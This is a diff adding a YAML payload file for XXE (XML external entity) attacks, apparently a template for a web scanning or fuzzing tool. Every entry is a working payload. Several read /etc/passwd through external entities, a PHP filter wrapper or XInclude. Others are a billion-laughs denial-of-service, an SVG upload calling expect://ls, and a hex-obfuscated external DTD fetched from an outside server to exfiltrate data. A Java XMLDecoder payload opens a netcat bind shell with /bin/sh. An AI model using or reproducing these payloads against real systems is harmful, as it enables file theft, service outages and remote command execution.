@@ -1,0 +1,70 @@
+payload:
+  - |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE data [
+    <!ELEMENT stockCheck ANY>
+    <!ENTITY file SYSTEM "file:///etc/passwd">
+    ]>
+    <stockCheck>
+        <productId>&file;</productId>
+        <storeId>1</storeId>
+    </stockCheck>
+  - | # Php wrapper
+    <!--?xml version="1.0" ?-->
+    <!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
+    <data>&example;</data>
+  - | # DoS
+    <!DOCTYPE data [
+    <!ENTITY a0 "dos" >
+    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+    ]>
+    <data>&a4;</data>
+  - | #XInclude
+    <root xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/>
+    </root>
+  - | # SVG File upload
+    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
+    <image xlink:href="expect://ls"></image>
+    </svg>
+  - | # HTML entities bypass
+    <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "<&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
+    <data>
+        <env>&exfil;</env>
+    </data>
+  - | # Java XMLDecoder XEE
+    <?xml version="1.0" encoding="UTF-8"?>
+    <java version="1.7.0_21" class="java.beans.XMLDecoder">
+    <object class="java.lang.Runtime" method="getRuntime">
+          <void method="exec">
+          <array class="java.lang.String" length="6">
+              <void index="0">
+                  <string>/usr/bin/nc</string>
+              </void>
+              <void index="1">
+                  <string>-l</string>
+              </void>
+              <void index="2">
+                  <string>-p</string>
+              </void>
+              <void index="3">
+                  <string>9999</string>
+              </void>
+              <void index="4">
+                  <string>-e</string>
+              </void>
+              <void index="5">
+                  <string>/bin/sh</string>
+              </void>
+          </array>
+          </void>
+    </object>
+    </java>
+encoder:
+  - Plain
+placeholder:
+  - XMLBody
+type: XXE
